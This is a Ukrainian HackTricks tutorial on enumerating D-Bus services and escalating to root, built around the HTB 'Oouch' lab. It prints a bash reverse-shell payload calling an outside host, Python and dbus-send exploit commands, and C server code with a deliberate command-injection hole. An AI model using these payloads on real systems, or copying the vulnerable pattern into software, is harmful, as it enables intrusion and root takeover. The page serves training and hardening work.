# Перерахування D-Bus і підвищення привілеїв через ін'єкцію команд

{{#include ../../banners/hacktricks-training.md}}

## **Перерахування через GUI**

D-Bus використовується як посередник для міжпроцесної взаємодії (IPC) у середовищах робочого столу Ubuntu. В Ubuntu спостерігається одночасна робота кількох шин повідомлень: системної шини, яка переважно використовується **привілейованими службами для надання служб, важливих для всієї системи**, і шини сеансу для кожного авторизованого користувача, яка надає служби, важливі лише для цього конкретного користувача. Тут основна увага приділяється системній шині через її зв'язок зі службами, що працюють із вищими привілеями (наприклад, від імені root), оскільки наша мета — підвищення привілеїв. Зазначається, що архітектура D-Bus використовує окремий «маршрутизатор» для кожної шини сеансу, який відповідає за перенаправлення повідомлень клієнтів до відповідних служб на основі адреси, указаною клієнтами для служби, з якою вони хочуть взаємодіяти.

Служби в D-Bus визначаються **об'єктами** та **інтерфейсами**, які вони надають. Об'єкти можна порівняти з екземплярами класів у стандартних мовах OOP, причому кожен екземпляр однозначно ідентифікується за допомогою **шляху до об'єкта**. Цей шлях, подібно до шляху у файловій системі, однозначно ідентифікує кожен об'єкт, наданий службою. Ключовим інтерфейсом для дослідження є інтерфейс **org.freedesktop.DBus.Introspectable**, що містить єдиний метод — Introspect. Цей метод повертає XML-представлення методів, сигналів і властивостей, які підтримує об'єкт; тут основну увагу приділено методам, а властивості та сигнали не розглядаються.

Для взаємодії з інтерфейсом D-Bus було використано два інструменти: CLI-інструмент **gdbus** для простого виклику методів, наданих D-Bus, у скриптах, і [**D-Feet**](https://wiki.gnome.org/Apps/DFeet) — GUI-інструмент на основі Python, призначений для перерахування служб, доступних у кожній шині, та відображення об'єктів, що містяться в кожній службі.
```bash
sudo apt-get install d-feet
```
Якщо ви перевіряєте **session bus**, спочатку підтвердьте поточну адресу:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

На першому зображенні показано services, зареєстровані в системній шині D-Bus, де **org.debin.apt** спеціально виділено після вибору кнопки System Bus. D-Feet надсилає цьому service запити щодо objects, відображаючи interfaces, methods, properties і signals для вибраних objects, як видно на другому зображенні. Також наведено сигнатуру кожного method.

Важливою функцією є відображення **process ID (pid)** і **command line** service, що допомагає перевірити, чи працює service з підвищеними привілеями. Це важливо для релевантності дослідження.

**D-Feet також дозволяє викликати methods**: користувачі можуть вводити Python expressions як parameters, які D-Feet перетворює на типи D-Bus перед передаванням до service.

Однак зверніть увагу, що **деякі methods потребують authentication** перед тим, як дозволити їх виклик. Ми проігноруємо такі methods, оскільки наша мета полягає в підвищенні привілеїв без credentials.

Також зверніть увагу, що деякі services надсилають запити до іншого D-Bus service з назвою org.freedeskto.PolicyKit1, щоб визначити, чи має користувач право виконувати певні actions.

## **Перерахування командного рядка**

### Список об'єктів service

Можна вивести список відкритих D-Bus interfaces за допомогою:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Сервіси, позначені як **`(activatable)`**, становлять особливий інтерес, оскільки вони **ще не запущені**, але запит до шини може запустити їх на вимогу. Не обмежуйтеся `busctl list`; зіставте ці імена з фактичними бінарними файлами, які вони запускатимуть.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Це швидко показує, який шлях `Exec=` буде запущено для activatable name і від імені якої ідентичності. Якщо бінарний файл або ланцюжок його виконання захищені неналежним чином, неактивний сервіс усе одно може стати шляхом до privilege escalation.

#### Connections

[З wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Коли процес встановлює з'єднання з шиною, шина призначає цьому з'єднанню спеціальне ім'я шини, яке називається _unique connection name_. Імена шин цього типу незмінні — гарантовано, що вони не зміняться, поки існує з'єднання, — і, що важливіше, їх не можна повторно використати протягом життєвого циклу шини. Це означає, що жодне інше з'єднання з цією шиною ніколи не отримає таке саме унікальне ім'я з'єднання, навіть якщо той самий процес закриє з'єднання з шиною, а потім створить нове. Унікальні імена з'єднань легко розпізнати, оскільки вони починаються із забороненого в інших випадках символу двокрапки.

### Інформація про об'єкт сервісу

Потім можна отримати певну інформацію про інтерфейс за допомогою:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Також зіставте ім’я шини з відповідним юнітом `systemd` і шляхом до виконуваного файлу:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Це відповідає на важливе під час privesc операційне питання: **якщо виклик методу успішний, який реальний binary і unit виконають цю дію?**

### Перелік інтерфейсів об’єкта service

Потрібно мати достатньо дозволів.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Інтроспекція інтерфейсу об'єкта служби

Зверніть увагу, що в цьому прикладі було вибрано останній виявлений інтерфейс за допомогою параметра `tree` (_див. попередній розділ_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Зверніть увагу на метод `.Block` інтерфейсу `htb.oouch.Block` (саме він нас цікавить). Літера «s» в інших стовпцях може означати, що очікується рядок.

Перш ніж намагатися виконати щось небезпечне, спочатку перевірте **орієнтований на читання** або інший метод із низьким ризиком. Це чітко розділяє три випадки: неправильний синтаксис, метод доступний, але доступ заборонено, або метод доступний і дозволений.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Correlate D-Bus Methods with Policies and Actions

Introspection показує, **що** ви можете викликати, але не пояснює, **чому** виклик дозволено або заборонено. Для реального privesc triage зазвичай потрібно одночасно перевірити **три рівні**:

1. **Activation metadata** (`.service` files або `SystemdService=`), щоб з’ясувати, який binary і unit фактично буде запущено.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), щоб з’ясувати, хто може виконувати `own`, `send_destination` або `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`), щоб з’ясувати модель авторизації за замовчуванням (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Не слід припускати відповідність 1:1 між методом D-Bus і дією Polkit. Той самий метод може вибирати іншу дію залежно від об’єкта, який змінюється, або контексту виконання. Тому практичний робочий процес такий:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` і grep відповідних `.policy` файлів
3. live-проби з низьким ризиком за допомогою `busctl call`, `gdbus call` або `dbusmap --enable-probes --null-agent`

Проксі- або compatibility-сервіси потребують особливої уваги. **Проксі, що працює від root**, пересилає запити до іншого сервісу D-Bus через власне заздалегідь встановлене з’єднання, може ненавмисно змусити backend вважати, що кожен запит надходить від UID 0, якщо ідентичність початкового викликувача не перевіряється повторно.

### Інтерфейс моніторингу/захоплення

Маючи достатні привілеї (одних привілеїв `send_destination` і `receive_sender` недостатньо), ви можете **моніторити комунікацію D-Bus**.

Щоб **моніторити** **комунікацію**, вам потрібно бути **root**. Якщо ви все одно виявляєте проблеми, працюючи від root, перевірте [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) і [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Якщо ви знаєте, як налаштувати конфігураційний файл D-Bus, щоб **дозволити користувачам, які не мають root, перехоплювати** комунікацію, будь ласка, **зв’яжіться зі мною**!

Різні способи моніторингу:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
У наведеному нижче прикладі інтерфейс `htb.oouch.Block` відстежується, а повідомлення **"**_**lalalalal**_**" надсилається через помилку комунікації**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Ви можете використовувати `capture` замість `monitor`, щоб зберегти результати у файлі **pcapng**, який може відкрити Wireshark:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Фільтрація всього шуму <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Якщо в шині надто багато інформації, передайте правило відповідності, як показано нижче:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Можна вказати кілька правил. Якщо повідомлення відповідає _будь-якому_ з правил, його буде виведено. Ось так:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Дивіться [документацію D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html), щоб отримати більше інформації про синтаксис правил зіставлення.

### Більше

`busctl` має ще більше опцій, [**знайдіть їх усі тут**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Вразливий сценарій**

Як користувач **qtc на хості "oouch" з HTB**, ви можете знайти **неочікуваний конфігураційний файл D-Bus**, розташований у _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
З попередньої конфігурації видно, що **для надсилання й отримання інформації** через цю комунікацію D-BUS ви маєте бути користувачем `root` або `www-data`.

Як користувач **qtc** усередині Docker-контейнера **aeb4525789d8** ви можете знайти код, пов’язаний із dbus, у файлі _/code/oouch/routes.py._ Ось цікавий фрагмент коду:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Як бачите, він **підключається до інтерфейсу D-Bus** і надсилає до функції **"Block"** значення "client_ip".

На іншому боці з'єднання D-Bus працює деякий скомпільований бінарний файл C. Цей код **прослуховує** з'єднання D-Bus, **очікуючи IP-адресу, і викликає iptables через функцію `system`**, щоб заблокувати вказану IP-адресу.\
**Виклик `system` навмисно вразливий до command injection**, тому такий payload створить reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Експлуатація

Наприкінці цієї сторінки ви знайдете **повний C-код застосунку D-Bus**. У ньому, між рядками 91–97, можна побачити, **як зареєстровано `D-Bus object path`** і **`interface name`**. Ця інформація буде необхідна для надсилання даних до з'єднання D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Також у рядку 57 видно, що **єдиний зареєстрований метод** для цієї D-Bus-комунікації має назву `Block`(_**Саме тому в наступному розділі payloads будуть надіслані до service object `htb.oouch.Block`, інтерфейсу `/htb/oouch/Block` і методу `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Наведений нижче код Python надсилає payload до D-Bus connection через метод `Block` за допомогою `block_iface.Block(runme)` (_зверніть увагу, що його було вилучено з попереднього фрагмента коду_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl та dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` — це інструмент, який використовується для надсилання повідомлень до «Message Bus»
- Message Bus — програмне забезпечення, яке системи використовують для спрощення комунікації між застосунками. Він пов’язаний із Message Queue (повідомлення впорядковуються послідовно), але в Message Bus повідомлення надсилаються за subscription model і дуже швидко.
- Тег “-system” використовується, щоб вказати, що це системне повідомлення, а не повідомлення сеансу (за замовчуванням).
- Тег “–print-reply” використовується для коректного виведення нашого повідомлення та отримання відповідей у зрозумілому для людини форматі.
- “–dest=Dbus-Interface-Block” — адреса Dbus interface.
- “–string:” — тип повідомлення, яке ми хочемо надіслати до interface. Існує кілька форматів надсилання повідомлень, наприклад double, bytes, booleans, int, objpath. Серед них “object path” корисний, коли потрібно надіслати шлях до файлу в Dbus interface. У цьому випадку можна використати спеціальний файл (FIFO), щоб передати команду до interface під виглядом імені файлу. “string:;” — це повторний виклик object path, у якому ми розміщуємо FIFO reverse shell файл/команду.

_Зверніть увагу, що в `htb.oouch.Block.Block` перша частина (`htb.oouch.Block`) посилається на service object, а остання частина (`.Block`) — на назву методу._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Допоміжні засоби автоматизованої Enumeration (2023-2025)

Enumeration великої attack surface D-Bus вручну за допомогою `busctl`/`gdbus` швидко стає обтяжливою. Дві невеликі FOSS-утиліти, випущені протягом останніх кількох років, можуть пришвидшити роботу під час red-team або CTF-операцій:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Написана мовою C; один статично скомпільований binary (<50 kB), який проходить кожен object path, отримує XML `Introspect` і визначає PID/UID власника.
* Корисні flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Утиліта позначає незахищені well-known names символом `!`, миттєво виявляючи services, які ви можете *own* (перехопити), або виклики methods, доступні з shell непривілейованого користувача.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Скрипт лише для Python, який шукає *writable* paths у systemd units і надто permissive D-Bus policy files (наприклад, `send_destination="*"`).
* Швидке використання:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module шукає у наведених нижче directories і підсвічує будь-який service, який може бути spoofed або hijacked звичайним користувачем:
* `/etc/dbus-1/system.d/` і `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Помітні D-Bus Bugs для Privilege Escalation (2024-2025)

Відстеження нещодавно опублікованих CVE допомагає виявляти подібні insecure patterns у custom code. Два хороші нещодавні приклади:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Service, який працював від root, відкривав D-Bus interface, який непривілейовані користувачі могли переналаштовувати, зокрема завантажувати контрольовану attacker-ом macro behavior. | Якщо daemon відкриває **device/profile/config management** у system bus, розглядайте writable configuration і macro features як primitives для code execution, а не просто як "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Compatibility proxy, який працював від root, перенаправляв requests до backend services без збереження security context початкового caller, тому backends довіряли proxy як UID 0. | Розглядайте **proxy / bridge / compatibility** D-Bus services як окремий bug class: якщо вони relay privileged calls, перевіряйте, як caller UID/Polkit context передається до backend. |

Patterns, на які слід звернути увагу:
1. Service працює **як root у system bus**.
2. Або **відсутня authorization check**, або перевірка виконується щодо **неправильного subject**.
3. Доступний method зрештою змінює system state: package install, user/group changes, bootloader config, device profile updates, file writes або direct command execution.

Використовуйте `dbusmap --enable-probes` або ручний `busctl call`, щоб підтвердити доступність method, а потім перевірте policy XML service та Polkit actions, щоб зрозуміти, **який subject** фактично проходить authorization.

---

## Швидкі заходи з Hardening і Detection

* Шукайте world-writable або відкриті для *send/receive* policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Вимагайте Polkit для небезпечних methods — навіть *root* proxies повинні передавати PID *caller* до `polkit_authority_check_authorization_sync()`, а не власний.
* Знижуйте privileges у довготривалих helpers (використовуйте `sd_pid_get_owner_uid()`, щоб перемикати namespaces після підключення до bus).
* Якщо ви не можете видалити service, щонайменше *scope* його до виділеної Unix group і обмежте доступ у його XML policy.
* Blue-team: захоплюйте system bus за допомогою `busctl capture > /var/log/dbus_$(date +%F).pcapng` та імпортуйте його у Wireshark для anomaly detection.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
